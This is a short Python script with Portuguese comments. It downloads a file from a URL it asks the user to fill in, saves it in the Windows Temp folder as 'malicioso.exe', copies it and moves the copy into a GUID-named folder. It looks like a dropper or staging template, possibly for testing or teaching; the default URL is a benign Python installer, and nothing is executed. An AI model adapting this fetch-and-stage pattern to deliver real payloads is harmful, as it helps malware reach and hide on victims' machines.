import requests
import shutil
import os
#insira a url abaixo
url = "https://www.python.org/ftp/python/2.7.6/python-2.7.6.amd64.msi"
req = requests.get(url)
file = open("C:"+os.sep+"Windows"+os.sep+"Temp"+os.sep+"malicioso.exe","ab")
#SEPARACAO INTELIGENTE + DUPLICACAO DO ARQUIVO MALICIOSO
file.write(req.content)
file.close()
shutil.copy("C:"+os.sep+"Windows"+os.sep+"Temp"+os.sep+"malicioso.exe","C:"+os.sep+"Windows"+os.sep+"Temp"+os.sep+"malicioso2.exe")
os.mkdir("C:"+os.sep+"Windows"+os.sep+"Temp"+os.sep+"203349C3-CB0E-4F1F-848D-7A0725F6E97A")
#Duplica o arquivo para outro diretorio Pode Sobrescrever outro arquivo
shutil.move("C:"+os.sep+"Windows"+os.sep+"Temp"+os.sep+"malicioso2.exe","C:"+os.sep+"Windows"+os.sep+"Temp"+os.sep+"203349C3-CB0E-4F1F-848D-7A0725F6E97A"+os.sep+"malicioso.exe")
